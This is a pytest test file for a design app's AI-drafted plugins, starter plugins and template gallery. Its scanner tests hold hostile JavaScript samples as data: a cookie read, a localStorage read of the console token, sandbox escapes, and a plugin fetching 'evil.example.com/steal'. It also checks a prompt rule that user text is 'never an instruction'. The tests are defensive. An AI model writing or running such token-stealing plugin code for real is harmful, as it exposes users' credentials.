"""D8b HOOLA DESIGN: plugins by Hoola, the starter plugins, the template gallery (docs/HOOLA_DESIGN_PLAN.md section 8).

The model is a FAKE (agent/door.acreate is replaced, like test_v0777_design_ai.py): what is tested is everything the
code does around it - the manifest schema, the static scan of the code (every rule), the smallest permissions, one
retry with the problems fed back and a plain 502 after, a plain 503 without a model, the rate limit, and that the
route NEVER installs anything. The eight starters pass the same check and run against a fake `hoola` in node
(web/design_plugins_ai_harness.js). Every built-in template passes the document's own rules, uses the editor's fonts,
reads at 4.5 : 1 and invents no phone number / price / email; "Use template" makes a new file only its owner sees;
her own templates are hers alone. A browser walk (web/design_plugins_ai_test.js) runs the whole thing on a real server."""
import asyncio
import json
import os
import re
import shutil
import socket
import subprocess
import sys
import time
import urllib.request
import xml.etree.ElementTree as ET
from pathlib import Path
from types import SimpleNamespace

import pytest
from fastapi.testclient import TestClient

from app.design import ai, gallery, plugin_ai, plugin_starters
from app.design.doc import APPLIED, ROOT, Doc, new_document

HERE = Path(__file__).resolve().parent
SERVER = HERE.parent
DESIGN = SERVER / "app" / "static" / "console" / "design"
HARNESS = HERE / "web" / "design_plugins_ai_harness.js"
WALK = HERE / "web" / "design_plugins_ai_test.js"
NODE = shutil.which("node")
SANDBOX_CHROME = "/opt/pw-browsers/chromium-1243/chrome-linux64/chrome"
needs_node = pytest.mark.skipif(not NODE, reason="node is not installed")
H = {"Authorization": "Bearer kd"}

GOOD = {"notes": "Numbers the selected layers.", "manifest": {
    "id": "step-numbers", "name": "Step numbers", "version": "1.0.0", "description": "Names the selected layers Step 1, Step 2 ...",
    "permissions": ["read", "edit", "storage", "export"], "ui": False, "menu": [{"label": "Number them", "command": "run"}],
    "author": "someone"},
    "code": "const sel = await hoola.selection();\nlet i = 1;\nfor (const n of sel) await hoola.set(n.id, {name: 'Step ' + i++});\n"
            "hoola.notify('Numbered ' + sel.length + ' layers.');\nawait hoola.close();\n"}


def bad(code: str, **man) -> dict:
    out = json.loads(json.dumps(GOOD))
    out["code"] = code
    out["manifest"].update(man)
    return out


@pytest.fixture()
def design_env(env, tmp_path, monkeypatch):
    monkeypatch.setenv("API_KEY", "kd")
    monkeypatch.setenv("DESIGN_DIR", str(tmp_path / "design"))
    from app.config import get_settings
    get_settings.cache_clear()
    ai._CALLS.clear()
    plugin_ai._CALLS.clear()
    ai._CLIENT = None
    yield monkeypatch
    get_settings.cache_clear()
    ai._CALLS.clear()
    plugin_ai._CALLS.clear()
    ai._CLIENT = None


def client():
    from app.main import app
    return TestClient(app)


class FakeModel:
    def __init__(self, monkeypatch, *answers):
        self.answers, self.asked = list(answers), []
        from app.agent import door

        async def acreate(_client, kw):
            self.asked.append(kw)
            text = self.answers.pop(0) if self.answers else "{}"
            if isinstance(text, Exception):
                raise text
            return SimpleNamespace(content=[SimpleNamespace(text=text if isinstance(text, str) else json.dumps(text))])
        monkeypatch.setattr(door, "acreate", acreate)

    def said(self, i: int) -> str:
        return self.asked[i]["messages"][0]["content"]


def other_headers():
    from app import accounts
    from app.db import User, session
    with session() as s:
        u = User(email="other-d8b@example.com", name="Other Person")
        s.add(u)
        s.flush()
        uid = u.id
    return {"Authorization": f"Bearer {accounts.issue_session(uid)}"}


# ======================================================================================= the static scan + manifest
def test_scan_refuses_every_escape_and_says_why():
    refused = {
        "eval": "eval('1')", "Function": "new Function('return 1')()", "constructor": "(() => 1).constructor('x')",
        "import": "await import('https://x.example.com/a.js')", "import line": "import x from 'y'", "require": "require('fs')",
        "importScripts": "importScripts('a.js')", "XMLHttpRequest": "new XMLHttpRequest()", "WebSocket": "new WebSocket('wss://a.b')",
        "fetch": "await fetch('https://api.example.com')", "navigator": "navigator.sendBeacon('/x')", "cookie": "document.cookie",
        "localStorage": "localStorage.getItem('hoola.console.token')", "sessionStorage": "sessionStorage.x", "indexedDB": "indexedDB.open('x')",
        "window": "window.x = 1", "self": "self.postMessage(1)", "globalThis": "globalThis.x", "this": "const g = (function () { return this; })();",
        "parent": "parent.document", "top": "top.location", "opener": "opener.x", "postMessage": "postMessage({})",
        "location": "location.href", "open": "open('https://a.b')", "worker": "new Worker('x.js')", "timer text": "setTimeout('alert(1)', 1)",
        "document.write": "document.write('x')", "computed": "hoola['fet' + 'ch']('x')", "script tag": "hoola.ui.show('<script>1</script>')",
        "inline handler": "hoola.ui.show('<img onerror=\"x\">')", "javascript url": "hoola.ui.show('<a href=\"javascript:1\">')",
        "escape": "const e = '\\u0065val'", "hex escape": "const e = '\\x65'", "prototype": "Object.prototype.x = 1",
        "detached run": "(async () => { await hoola.page(); })();", "defaultView": "x.ownerDocument.defaultView", "Blob": "new Blob(['x'])",
    }
    for what, code in refused.items():
        problems = plugin_ai.scan_code(code)
        assert problems, what
        assert all(re.match(r"line \d+: `.+` is not allowed \(.+: .+\)$", p) for p in problems), problems
    for code in ("const n = await hoola.get('1:1'); if (n.parent === '0:1') hoola.notify('on this page.');",
                 "await hoola.fetch('https://api.example.com/v1', {method: 'GET'});", "const top10 = [1, 2]; const parentId = n.parent;",
                 "hoola.ui.show('<button data-action=\"go\">Go</button>');", "hoola.notify('Select the frames first, at the top.');"):
        assert plugin_ai.scan_code(code) == [], code
    assert "2" in plugin_ai.scan_code("const a = 1;\neval(a);")[0][:7], "the line is named"
    assert plugin_ai.scan_code("") and plugin_ai.scan_code("x" * (plugin_ai.CODE_MAX + 1))


def test_manifest_schema_and_smallest_permissions():
    v = plugin_ai.validate(GOOD["manifest"], GOOD["code"])
    m = v["manifest"]
    assert m["permissions"] == ["read", "edit"], "storage and export are never used, so they are taken out"
    assert any("never uses" in n for n in v["notes"]) and any("author" in n for n in v["notes"]), "both said, nothing silent"
    assert set(m) == set(plugin_ai.MANIFEST_KEYS) and m["ui"] is False and m["menu"] == [{"label": "Number them", "command": "run"}]
    assert [p["name"] for p in v["permissions"]] == ["read", "edit"] and all(p["says"] for p in v["permissions"])
    cases = [
        ({"permissions": ["read"]}, GOOD["code"], 'need the "edit" permission'),
        ({"permissions": ["read", "edit", "admin"]}, GOOD["code"], 'unknown permission "admin"'),
        ({"permissions": ["read", "edit", "net:http://evil.example.com/x"]}, GOOD["code"], "ONE host"),
        ({"permissions": ["read", "edit", "net:localhost"]}, GOOD["code"], "not a public host"),
        ({"permissions": ["read", "edit", "net:10.0.0.1"]}, GOOD["code"], "not a public host"),
        ({"id": "Bad Id!"}, GOOD["code"], '"id"'), ({"name": ""}, GOOD["code"], '"name"'), ({"version": "one"}, GOOD["code"], '"version"'),
        ({"menu": [{"label": "A", "command": "Run It"}]}, GOOD["code"], "command lowercase"),
        ({"menu": [{"label": "A", "command": "a"}, {"label": "B", "command": "a"}]}, GOOD["code"], "share one command"),
        ({}, GOOD["code"] + "\nawait hoola.fetch('https://api.example.com/x');", '"net:api.example.com"'),
        ({"permissions": ["read", "edit", "net:api.example.com"]}, GOOD["code"] + "\nawait hoola.fetch('https://other.example.org/x');",
         "other.example.org, which is not declared"),
        ({"permissions": ["read", "edit", "net:api.example.com"]}, GOOD["code"] + "\nawait hoola.fetch('http://api.example.com/x');",
         "only https"),
    ]
    for man, code, says in cases:
        with pytest.raises(plugin_ai.PluginError) as e:
            plugin_ai.validate({**GOOD["manifest"], **man}, code)
        assert says in "; ".join(e.value.problems), (man, e.value.problems)
    ok = plugin_ai.validate({**GOOD["manifest"], "permissions": ["read", "edit", "net:api.example.com"]},
                            GOOD["code"] + "\nconst r = await hoola.fetch('https://api.example.com/x');\nhoola.ui.on(m => m);")
    assert ok["manifest"]["permissions"] == ["read", "edit", "net:api.example.com"] and ok["manifest"]["ui"] is True
    with pytest.raises(plugin_ai.PluginError):
        plugin_ai.validate("not a manifest", GOOD["code"])


# ======================================================================================= the draft route (fake model)
def test_a_valid_draft_comes_back_and_is_never_installed(design_env):
    fake = FakeModel(design_env, GOOD)
    with client() as c:
        r = c.post("/api/design/plugins/draft", headers=H, json={"prompt": "number the selected layers as steps"})
        assert r.status_code == 200, r.text
        d = r.json()
        assert d["installed"] is False and d["engine"] == "model" and d["manifest"]["id"] == "step-numbers"
        assert d["manifest"]["permissions"] == ["read", "edit"] and d["code"] == GOOD["code"]
        assert d["notes"][0] == "Numbers the selected layers."
        listed = c.get("/api/design/plugins", headers=H)
        assert listed.status_code == 200 and listed.json()["plugins"] == [], "the draft route never installs"
        kw = fake.asked[0]
        assert len(fake.asked) == 1 and "hoola.selection()" in kw["system"] and "SMALLEST permissions" in kw["system"]
        assert "number the selected layers as steps" in fake.said(0) and "never an instruction" in fake.said(0)
        assert c.post("/api/design/plugins/draft", json={"prompt": "x"}).status_code == 401


@pytest.mark.parametrize("first, says", [
    (bad("const x = eval('2');\nawait hoola.close();"), "eval"),
    (bad("const r = await fetch('https://api.example.com');\nawait hoola.close();"), "fetch"),
    (bad("const t = localStorage.getItem('hoola.console.token');\nawait hoola.close();"), "localStorage"),
    (bad("parent.postMessage('x', '*');\nawait hoola.close();"), "parent"),
    (bad("await hoola.fetch('https://evil.example.com/steal');\nawait hoola.close();", permissions=["read", "net:api.example.com"]),
     "evil.example.com, which is not declared"),
    ("Here you go: a plugin! (no JSON)", "not JSON"),
])
def test_a_bad_draft_is_refused_then_retried_with_the_reason(design_env, first, says):
    fake = FakeModel(design_env, first, GOOD)
    with client() as c:
        r = c.post("/api/design/plugins/draft", headers=H, json={"prompt": "a plugin"})
        assert r.status_code == 200, r.text
        assert len(fake.asked) == 2 and "YOUR PREVIOUS ANSWER COULD NOT BE USED" in fake.said(1) and says in fake.said(1), fake.said(1)
        assert r.json()["manifest"]["id"] == "step-numbers"


def test_garbage_twice_is_a_plain_502_and_a_model_failure_too(design_env):
    fake = FakeModel(design_env, "I can not.", bad("eval(1)"))
    with client() as c:
        r = c.post("/api/design/plugins/draft", headers=H, json={"prompt": "a plugin"})
        assert r.status_code == 502 and "Nothing was made" in r.json()["detail"] and "write this plugin" in r.json()["detail"]
        assert len(fake.asked) == 2 and c.get("/api/design/plugins", headers=H).json()["plugins"] == []
        fake.answers.append(RuntimeError("connection reset by peer"))
        r = c.post("/api/design/plugins/draft", headers=H, json={"prompt": "a plugin"})
        assert r.status_code == 502 and "connection reset" not in r.text and len(fake.asked) == 3


def test_no_model_says_so_plainly_and_never_fakes_a_plugin(design_env):
    design_env.setenv("ANTHROPIC_API_KEY", "")
    design_env.setenv("CHAT_LLM", "claude")
    from app.config import get_settings
    get_settings.cache_clear()
    fake = FakeModel(design_env, GOOD)
    with client() as c:
        r = c.post("/api/design/plugins/draft", headers=H, json={"prompt": "a plugin"})
        assert r.status_code == 503 and "No AI model is configured" in r.json()["detail"] and "starter plugins" in r.json()["detail"]
        assert fake.asked == []
        assert c.get("/api/design/plugins/starters", headers=H).json()["starters"], "the starters work without a model"


def test_rate_limit_prompt_cap_and_switch(design_env):
    design_env.setenv("DESIGN_AI_PER_HOUR", "2")
    from app.config import get_settings
    get_settings.cache_clear()
    FakeModel(design_env, GOOD, GOOD, GOOD)
    with client() as c:
        for body in ({"prompt": ""}, {"prompt": "   "}, {"prompt": "x" * 1201}, {"prompt": 7}, {}):
            assert c.post("/api/design/plugins/draft", headers=H, json=body).status_code == 400, body
        codes = [c.post("/api/design/plugins/draft", headers=H, json={"prompt": "a plugin"}).status_code for _ in range(3)]
        assert codes == [200, 200, 429]
        design_env.setenv("DESIGN_AI", "false")
        get_settings.cache_clear()
        plugin_ai._CALLS.clear()
        assert c.post("/api/design/plugins/draft", headers=H, json={"prompt": "a plugin"}).status_code == 403


# ======================================================================================= the starters
def test_starters_pass_the_check_and_ask_for_the_least(design_env):
    plugin_starters._CACHE = None
    from app.design import plugins as d8a
    with client() as c:
        got = c.get("/api/design/plugins/starters", headers=H)
        assert got.status_code == 200
        rows = got.json()["starters"]
    assert len(rows) == len(plugin_starters.STARTERS) == 8
    perms = {r["manifest"]["id"]: (r["manifest"]["permissions"], r["manifest"]["ui"]) for r in rows}
    assert perms == {"hoola.rename-layers": (["read", "edit"], True), "hoola.tidy-grid": (["read", "edit"], False),
                     "hoola.contrast-check": (["read", "edit"], True), "hoola.find-replace": (["read", "edit"], True),
                     "hoola.palette-styles": (["read", "edit"], False), "hoola.indian-numbers": (["read", "edit"], False),
                     "hoola.css-variables": (["read"], True), "hoola.swap-fonts": (["read", "edit"], True)}
    for r in rows:
        assert plugin_ai.validate(r["manifest"], r["code"])["manifest"] == r["manifest"], "the very check a Hoola draft passes"
        assert d8a.clean_manifest(r["manifest"])["id"] == r["manifest"]["id"], "D8a's own install check accepts it"
        assert r["starter"] is True and r["by"] == "Hoola" and not any(p.startswith("net:") for p in r["manifest"]["permissions"])
    with client() as c:                                          # and D8a really installs one (her review is the browser walk)
        s = rows[0]
        put = c.post("/api/design/plugins", headers=H, json={"manifest": s["manifest"], "code": s["code"]})
        assert put.status_code == 200, put.text


@needs_node
def test_starters_run_against_a_fake_hoola(tmp_path):
    plugin_starters._CACHE = None
    data = tmp_path / "starters.json"
    data.write_text(json.dumps(plugin_starters.listing()))
    run = subprocess.run([NODE, str(HARNESS), str(data)], capture_output=True, text=True, timeout=120)
    assert run.returncode == 0, run.stdout[-2000:] + run.stderr[-3000:]
    assert run.stdout.count("PASS ") == 8 and "ALL 8 STARTERS OK" in run.stdout


# ======================================================================================= the templates
def _texts(nodes):
    return [n for n in nodes.values() if n.get("type") == "TEXT"]


def test_every_template_is_a_valid_honest_document():
    assert 16 <= len(gallery.TIDS) <= 24 and len(set(gallery.TIDS)) == len(gallery.TIDS)
    names = " ".join(t[1].lower() for t in gallery._LIST)
    for need in ("sale", "diwali", "eid", "christmas", "coaching", "post", "story", "whatsapp", "business card", "wedding",
                 "menu", "sign-in", "home screen", "slide", "youtube", "certificate"):
        assert need in names, need
    fonts = set(ai.FONTS)
    for tid in gallery.TIDS:
        b = gallery.build(tid)
        doc = Doc(new_document(""))
        made = {k: v for k, v in b["nodes"].items() if k not in ("0:0", "0:1")}
        assert all(doc.apply({"id": nid, "p": p}) == APPLIED for nid, p in made.items()), tid
        assert all(k.startswith("1:") for k in made), "ids under client number 1"
        assert b["fixed"] == 0, f"{tid}: a text needed a contrast fix, so the template was not designed right"
        assert b["dropped"] == 0 and b["layers"] <= ai.MAX_NODES, tid
        texts = _texts(b["nodes"])
        used = {n.get("font", "Inter") for n in texts}
        assert used <= fonts and len(used) <= 2, (tid, used)
        guard = ai.Facts("")
        for n in texts:
            assert guard.guard(n["chars"]) == n["chars"], f"{tid}: {n['chars']!r} carries an invented phone / price / email"
            assert not re.search(r"\d{5,}", n["chars"].replace(",", "")), (tid, n["chars"])
            assert ai.script_of(n["chars"]) == "" or n["font"] in ai.SCRIPTS[ai.script_of(n["chars"])][1], (tid, n["chars"], n["font"])
        blob = json.dumps(b["nodes"])
        assert '"type": "image"' not in blob and not re.search(r"[0-9a-f]{64}", blob), "no pictures of anyone else"
        assert any(k == "aiSettle" for n in made.values() for k in n), "the first editor settles the text with the real fonts"
    hindi = [n["chars"] for n in _texts(gallery.build("wedding-invite")["nodes"])]
    assert any(ai.script_of(t) == "devanagari" for t in hindi) and any(ai.script_of(t) == "" and "[" in t for t in hindi)


def test_template_routes_use_and_thumbnails(design_env):
    with client() as c:
        lst = c.get("/api/design/templates", headers=H)
        assert lst.status_code == 200
        body = lst.json()
        assert len(body["templates"]) == len(gallery.TIDS) and body["mine"] == [] and "Festivals" in body["categories"]
        fest = c.get("/api/design/templates?category=Festivals", headers=H).json()["templates"]
        assert {t["id"] for t in fest} == {"diwali-poster", "eid-poster", "christmas-poster", "holi-post"}
        assert [t["id"] for t in c.get("/api/design/templates?q=wedding hindi", headers=H).json()["templates"]] == ["wedding-invite"]
        th = c.get("/api/design/templates/diwali-poster/thumb", headers=H)
        assert th.status_code == 200 and th.headers["content-type"].startswith("image/svg+xml")
        assert "sandbox" in th.headers["content-security-policy"] and th.headers["x-content-type-options"] == "nosniff"
        svg = ET.fromstring(th.content)
        assert svg.get("viewBox") == "0 0 1240 1754" and "शुभ दीपावली" in th.text and "<script" not in th.text
        assert c.get("/api/design/templates/nope/thumb", headers=H).status_code == 404
        assert c.get("/api/design/templates", ).status_code == 401
        made = c.post("/api/design/templates/app-login/use", headers=H, json={})
        assert made.status_code == 200, made.text
        f = made.json()
        assert f["name"] == "App sign-in screen" and f["nodes"] > 10
        nodes = c.get(f"/api/design/files/{f['id']}/doc", headers=H).json()["doc"]["nodes"]
        want = gallery.build("app-login")["nodes"]
        assert set(nodes) == set(want) and nodes[gallery.build("app-login")["root"]]["w"] == 390
        with c.websocket_connect(f"/api/design/ws?file={f['id']}", headers=H) as sock:
            init = sock.receive_json()
            assert init["t"] == "init" and init["cid"] >= 2, "a new editor never mints one of the template's ids"
        assert c.post("/api/design/templates/nope/use", headers=H, json={}).status_code == 404
        named = c.post("/api/design/templates/business-card/use", headers=H, json={"name": "Sharma card"}).json()
        assert named["name"] == "Sharma card"
        other = other_headers()
        assert c.get(f"/api/design/files/{f['id']}", headers=other).status_code == 404, "another account can not see her new file"
        assert c.get(f"/api/design/files/{f['id']}/doc", headers=other).status_code == 404
        ids = {r["id"] for r in c.get("/api/design/files", headers=H).json()["files"]}
        assert {f["id"], named["id"]} <= ids


def test_her_own_templates_are_hers_alone(design_env):
    with client() as c:
        f = c.post("/api/design/templates/eid-poster/use", headers=H, json={"name": "My Eid poster"}).json()
        other = other_headers()
        assert c.post(f"/api/design/files/{f['id']}/publish-template", headers=other, json={"name": "Stolen"}).status_code == 404
        assert c.post(f"/api/design/files/{f['id']}/publish-template", json={"name": "x"}).status_code == 401
        token = c.post(f"/api/design/files/{f['id']}/share", headers=H, json={"role": "view"}).json()["token"]
        assert c.post(f"/api/design/files/{f['id']}/publish-template", headers={"Authorization": f"Bearer {token}"}, json={}).status_code == 401
        pub = c.post(f"/api/design/files/{f['id']}/publish-template", headers=H, json={"name": "Shop Eid", "category": "festivals"})
        assert pub.status_code == 200, pub.text
        t = pub.json()
        assert t["id"].startswith("mine_") and t["reviewed"] is False and t["public"] is False and t["category"] == "Festivals"
        mine = c.get("/api/design/templates", headers=H).json()["mine"]
        assert [m["id"] for m in mine] == [t["id"]] and mine[0]["name"] == "Shop Eid"
        assert c.get("/api/design/templates", headers=other).json()["mine"] == [], "never listed to anybody else"
        assert c.post(f"/api/design/templates/{t['id']}/use", headers=other, json={}).status_code == 404
        assert c.get(f"/api/design/templates/{t['id']}/thumb", headers=other).status_code == 404
        assert c.delete(f"/api/design/templates/{t['id']}", headers=other).status_code == 404
        th = c.get(f"/api/design/templates/{t['id']}/thumb", headers=H)
        assert th.status_code == 200 and th.headers["content-type"].startswith("image/svg+xml")
        copy = c.post(f"/api/design/templates/{t['id']}/use", headers=H, json={}).json()
        assert copy["name"] == "Shop Eid" and copy["id"] != f["id"]
        a = c.get(f"/api/design/files/{f['id']}/doc", headers=H).json()["doc"]["nodes"]
        b = c.get(f"/api/design/files/{copy['id']}/doc", headers=H).json()["doc"]["nodes"]
        assert set(a) == set(b)
        from app.design.models import DesignFile
        from app.db import session
        with session() as s:
            assert s.get(DesignFile, copy["id"]).next_cid >= s.get(DesignFile, f["id"]).next_cid
        empty = c.post("/api/design/files", headers=H, json={"name": "Blank"}).json()
        assert c.post(f"/api/design/files/{empty['id']}/publish-template", headers=H, json={}).status_code == 400
        assert c.post("/api/design/files/df_nope/publish-template", headers=H, json={}).status_code == 404
        assert c.delete(f"/api/design/templates/{t['id']}", headers=H).json() == {"ok": True}
        assert c.get("/api/design/templates", headers=H).json()["mine"] == []
        assert c.delete("/api/design/templates/diwali-poster", headers=H).status_code == 404, "a built-in can not be deleted"


# ======================================================================================= the agent tool
def test_tool_templates_use_template_and_make_plugin(design_env):
    from app.agent import design_tools
    from app.agent.tools import Ctx, ToolError
    from app.config import get_settings
    spec = design_tools.DESIGN_TOOLS[0]
    assert {"templates", "use_template", "make_plugin"} <= set(spec["input_schema"]["properties"]["action"]["enum"])
    fake = FakeModel(design_env, GOOD)
    ctx = Ctx(tenant_id=get_settings().tenant_id, conversation_id="c1")
    run = lambda **a: asyncio.run(design_tools.hoola_design(ctx, **a))      # noqa: E731
    got = run(action="templates", category="App screens")
    assert {t["template"] for t in got["templates"]} == {"app-login", "app-home"} and got["mine"] == []
    made = run(action="use_template", template="Restaurant menu")
    assert made["status"] == "done" and made["link"].endswith(f"#/f/{made['file_id']}") and "[blank]" in made["note"]
    with pytest.raises(ToolError):
        run(action="use_template", template="poster")                  # more than one: says which
    with pytest.raises(ToolError):
        run(action="use_template")
    d = run(action="make_plugin", prompt="number the selected layers")
    assert d["status"] == "draft" and d["installed"] is False and d["manifest"]["permissions"] == ["read", "edit"]
    assert "NOT installed" in d["note"] and len(fake.asked) == 1
    from app.design import plugins as d8a
    from app.db import session
    with session() as s:
        assert s.query(d8a.DesignPlugin).count() == 0, "the tool never installs"


# ======================================================================================= the client files
def test_client_files_are_wired_in_order():
    html = (DESIGN / "design.html").read_text()
    at = [html.index(f"design/{n}") for n in ("hd-plugins.js", "hd-plugins-ai.js", "hd-app.js")]
    assert at == sorted(at) and "design-plugins-ai.css" in html
    stamp = re.search(r"hd-app\.js\?v=([\d.]+)", html).group(1)
    assert f"hd-plugins-ai.js?v={stamp}" in html and f"design-plugins-ai.css?v={stamp}" in html
    js = (DESIGN / "hd-plugins-ai.js").read_text()
    code = re.sub(r"/\*.*?\*/", "", js, flags=re.S)
    assert "innerHTML" not in code and "eval(" not in code and "new Function" not in code
    assert "HD.plugins.install(d.manifest, d.code)" in code, "a draft goes through D8a's review dialog"
    assert "/plugins/draft" in code and "/templates/" in code and "/publish-template" in code


@needs_node
def test_client_files_parse():
    for path in (DESIGN / "hd-plugins-ai.js", HARNESS, WALK):
        run = subprocess.run([NODE, "--check", str(path)], capture_output=True, text=True, timeout=60)
        assert run.returncode == 0, run.stderr[-2000:]


# ======================================================================================= the browser walk
def _free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


@needs_node
def test_gallery_and_plugins_in_a_real_browser(tmp_path):
    port, key = _free_port(), "d8b-test-key"
    env = os.environ.copy()
    env.update({"DATABASE_URL": f"sqlite:///{tmp_path}/d8b.db", "API_KEY": key, "WA_DRY_RUN": "true", "ANTHROPIC_API_KEY": "test",
                "SEMANTIC_OFF": "1", "MEMORY_AUTO": "false", "HOOLA_ENRICH": "false", "VIDEO_EDIT_WORKER": "false",
                "OPERATOR_WORKER": "false", "DESIGN_PAGE": "true", "DESIGN_DIR": str(tmp_path / "design"), "PYTHONPATH": str(SERVER)})
    log = open(tmp_path / "server.log", "w")
    server = subprocess.Popen([sys.executable, "-m", "uvicorn", "app.main:app", "--port", str(port), "--log-level", "warning"],
                              cwd=tmp_path, env=env, stdout=log, stderr=subprocess.STDOUT)
    run = None
    try:
        base, up = f"http://127.0.0.1:{port}", False
        for _ in range(240):
            if server.poll() is not None:
                break
            try:
                with urllib.request.urlopen(base + "/console/design", timeout=2) as r:
                    up = r.status == 200
                    break
            except Exception:                            # noqa: BLE001 - not listening yet
                time.sleep(0.5)
        if not up:
            log.flush()
            pytest.fail("the server did not start: " + (tmp_path / "server.log").read_text()[-1500:])
        plugin_starters._CACHE = None
        draft = plugin_ai.validate(GOOD["manifest"], GOOD["code"])
        jenv = os.environ.copy()
        jenv.update({"HD_BASE": base, "HD_KEY": key, "HD_DRAFT": json.dumps({**draft, "engine": "model", "installed": False})})
        if jenv.get("HOOLA_CHROMIUM"):
            jenv["CHROMIUM_EXECUTABLE"] = jenv["HOOLA_CHROMIUM"]
        run = subprocess.run([NODE, str(WALK)], capture_output=True, text=True, timeout=600, env=jenv)
        if run.returncode == 77 and not jenv.get("HOOLA_CHROMIUM") and Path(SANDBOX_CHROME).exists():
            jenv["CHROMIUM_EXECUTABLE"] = SANDBOX_CHROME
            run = subprocess.run([NODE, str(WALK)], capture_output=True, text=True, timeout=600, env=jenv)
    finally:
        server.terminate()
        try:
            server.wait(timeout=20)
        except subprocess.TimeoutExpired:
            server.kill()
        log.close()
    if run.returncode == 77:
        pytest.skip((run.stdout.strip().splitlines() or ["no browser here"])[-1])
    assert run.returncode == 0, (run.stdout[-2500:] + "\n" + run.stderr[-4000:] + "\n--- server ---\n" + (tmp_path / "server.log").read_text()[-1500:])
    report = json.loads(run.stdout.strip().splitlines()[-1])
    assert report["ok"] is True and report["checks"] >= 20, report
